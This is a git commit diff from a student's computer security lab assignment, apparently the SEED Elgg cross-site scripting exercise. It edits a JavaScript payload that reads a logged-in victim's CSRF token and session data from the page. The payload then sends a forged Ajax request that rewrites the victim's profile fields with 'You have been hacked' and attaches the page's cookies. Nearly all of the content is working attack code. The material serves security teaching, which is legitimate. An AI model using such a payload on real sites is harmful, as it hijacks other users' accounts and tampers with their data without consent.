189f239cfb484dff8cc54c7ac0b958da35c81887
AbdurRahmanFahad <1605069@ugrad.cse.buet.ac.bd>
2021-06-21 04:36:38 +0600

    task 2 script editing done

--- Computer Security/offline 2/scripts/1605069_Task_2.js
+++ Computer Security/offline 2/scripts/1605069_Task_2.js
@@ -3,7 +3,7 @@
 	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
 	//and Security Token __elgg_token
 	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
-    var token="&__elgg_token="+elgg.security.token.__elgg_token;
+    var token="__elgg_token="+elgg.security.token.__elgg_token;
 
     //Construct the content of your url.
     var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
@@ -22,7 +22,8 @@
 &interests=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Binterests%5D=1
 &skills=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bskills%5D=1
 &contactemail=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bcontactemail%5D=1
-&phone=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=1
+&phone=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bphone%5D=2
+&mobile=&accesslevel%5Bmobile%5D=1
 &website=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bwebsite%5D=1
 &twitter=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Btwitter%5D=1
 &guid=44
@@ -31,11 +32,55 @@
     var description = "&description=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=1";
     var briefdescription = "&briefdescription=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bbriefdescription%5D=1";
     var location = "&location=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Blocation%5D=1"
-    var habijabi = "&interests=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Binterests%5D=1&skills=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bskills%5D=1&contactemail=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bcontactemail%5D=1&phone=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=1&website=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bwebsite%5D=1&twitter=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Btwitter%5D=1";
+    //var habijabi = "&interests=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Binterests%5D=1&skills=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bskills%5D=1&contactemail=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bcontactemail%5D=1&phone=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=1&website=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Bwebsite%5D=1&twitter=%3Cp%3E1605069%3C%2Fp%3E%0D%0A&accesslevel%5Btwitter%5D=1";
+    var namee = elgg.session.user.name;
+    //var namee = 'fahad'
+    var content=token+ts+namee+description+briefdescription+location+habijabi+"&guid="+elgg.session.user.guid; //FILL IN
 
-    var content=description+briefdescription+location+habijabi+"&guid="+elgg.session.user.guid; //FILL IN
+    //var params = JSON.stringify({__elgg_token : elgg.security.token.__elgg_token });
 
-    if(//Condition to check if the user is not Samy)
+    var userid = elgg.page_owner.guid;
+
+    var data = new FormData();
+    data.append('__elgg_token', elgg.security.token.__elgg_token );
+    data.append('__elgg_ts', elgg.security.token.__elgg_ts);
+
+    data.append('name', namee);
+
+    data.append('description', '1605069');
+    data.append('accesslevel[description]', 1);
+
+    data.append('briefdescription', 'You have been hacked');
+    data.append('accesslevel[briefdescription]', 1);
+
+    data.append('location', 'You have been hacked');
+    data.append('accesslevel[location]', 1);
+
+    data.append('interests', 'You have been hacked');
+    data.append('accesslevel[interests]', 1);
+
+    data.append('skills', 'You have been hacked');
+    data.append('accesslevel[skills]', 1);
+
+    data.append('contactemail', 'You have been hacked');
+    data.append('accesslevel[contactemail]', 1);
+
+    data.append('phone', 'You have been hacked');
+    data.append('accesslevel[phone]', 1);
+
+    data.append('mobile', 'You have been hacked');
+    data.append('accesslevel[mobile]', 1);
+
+    data.append('website', 'You have been hacked');
+    data.append('accesslevel[website]', 1);
+
+    data.append('twitter', 'You have been hacked');
+    data.append('accesslevel[twitter]', 1);
+
+    data.append('guid', elgg.session.user.guid);
+
+
+    if(elgg.session.user.guid != userid)
     {
 		//Create and send Ajax request to modify profile
 		var Ajax=null;
@@ -44,8 +89,9 @@
     //Ajax.setRequestHeader("Host","www.xsslabelgg.com");
     //Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     Ajax.setRequestHeader("Referer",referer);
+    Ajax.setRequestHeader("Cookie",document.cookie);
 
-    Ajax.send(content);
+    Ajax.send(data);
 	}
 	}
 </script>
